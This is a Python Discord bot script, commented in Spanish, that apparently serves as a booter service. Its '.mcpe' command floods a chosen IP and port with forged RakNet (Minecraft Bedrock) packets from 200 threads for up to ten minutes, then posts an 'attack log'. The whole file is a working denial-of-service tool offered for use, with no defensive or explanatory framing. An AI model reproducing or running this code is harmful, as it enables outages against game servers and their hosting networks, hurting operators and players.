import discord
from discord.ext import commands
import socket
import threading
import time
import struct
import random
import os

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='.', intents=intents)

# Generador dinámico de variantes RAKNET MAGIC
def generate_magic_variants(count=5000):
    variants = []
    for _ in range(count):
        base = bytes([random.randint(0, 255) for _ in range(12)])
        variants.append(base + b'\x12\x34\x56\x78')
    return variants

RAKNET_MAGIC_VARIANTS = generate_magic_variants()

def raknet_extreme(ip, port, duration):
    end_time = time.time() + duration

    def flood():
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.1)  # Reducción del tiempo de espera para aumentar la velocidad

                for magic in RAKNET_MAGIC_VARIANTS:
                    for _ in range(5000):  # Enviar 5000 paquetes por ataque
                        sock.sendto(b'\x01' + struct.pack('>Q', random.randint(1, 9999999999)) + magic + os.urandom(128), (ip, port))
                        sock.sendto(b'\x05' + magic + os.urandom(128), (ip, port))
                        client_id = random.randint(100000, 999999)
                        spoof_ip = socket.inet_aton(f"192.168.{random.randint(0,255)}.{random.randint(0,255)}")
                        req2 = b'\x07' + magic + spoof_ip + struct.pack('>H', random.randint(1000, 65535)) + struct.pack('>Q', client_id) + os.urandom(64)
                        sock.sendto(req2, (ip, port))
                        sock.sendto(b'\x06' + magic + os.urandom(128), (ip, port))
                        sock.sendto(b'\x09' + magic + struct.pack('>Q', random.randint(1, 999999)) + os.urandom(256), (ip, port))
                sock.close()
            except Exception as e:
                print(f"Error: {e}")
                continue

    for _ in range(200):  # Utilizar 200 hilos para aumentar la potencia del ataque
        threading.Thread(target=flood, daemon=True).start()

@bot.command()
async def mcpe(ctx, ip=None, port=None, duration=None):
    if not ip or not port or not duration:
        await ctx.send("Uso: `.mcpe <ip> <puerto> <duración>`")
        return

    try:
        port = int(port)
        duration = int(duration)
        if duration > 600 or port < 1 or port > 65535:
            raise ValueError
    except:
        await ctx.send("Puerto o duración inválidos.")
        return

    raknet_extreme(ip, port, duration)

    attack_data = {
        "status": "success",
        "message": "Ataque enviado exitosamente",
        "attack_log": {
            "username": str(ctx.author),
            "service": "Apsx Services",
            "host": ip,
            "port": port,
            "time": f"{duration} segundos",
            "method": "RAKNET-FLOOD EXTREME",
            "handlers": "Node (4), Node (1)"
        }
    }

    await ctx.send("```json\n" + str(attack_data) + "\n```")

bot.run("YOUR_BOT_TOKEN")
